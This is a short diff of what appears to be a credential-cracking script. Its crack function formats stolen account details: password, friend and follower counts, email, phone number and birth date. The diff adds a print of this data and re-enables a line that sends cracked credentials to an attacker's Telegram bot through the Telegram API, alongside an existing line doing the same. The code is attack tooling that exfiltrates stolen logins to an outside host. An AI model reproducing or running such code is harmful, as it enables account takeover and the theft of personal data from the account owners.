@@ -1174,6 +1174,7 @@ def crack(idf,pwv):
 ✵ - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗׀\n {pw}
 ⊊𝗕𝗬⊋ ➩ @H_7_Z_W\n𖣘────────────────────𖣘\n✵ - 𝗝𝗨𝗠𝗟𝗔𝗛 𝗧𝗘𝗠𝗔𝗡 : {teman}\n✵ - 𝗝𝗨𝗠𝗟𝗔𝗛 𝗣𝗘𝗡𝗚𝗜𝗞𝗨𝗧 : {pengikut}\n✵ - 𝗘𝗠𝗔𝗜𝗟 𝗔𝗞𝗧𝗜f : {email}\n✵ - 𝗡𝗢𝗠𝗢𝗥 𝗔𝗞𝗧𝗜f : {nomer}\n✵ - 𝗧𝗔𝗛𝗨𝗡 𝗔𝗞𝗨𝗡 : {tahun}\n✵ - 𝗧𝗔𝗡𝗚𝗚𝗔𝗟 𝗟𝗔𝗛𝗜𝗥 : {ttl}𖣘────────𓌹𖣘ِ𝐇𝐀𝐙𝐀𝐑𝐃🇸🇩𖣘𓌺────────𖣘
 @H_7_Z_W '''
+					print (infoakun) 
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
 
 					hit1, hit2 = 0,0
@@ -1209,7 +1210,7 @@ def crack(idf,pwv):
 					'''
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
-					#requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
 					break
 
 
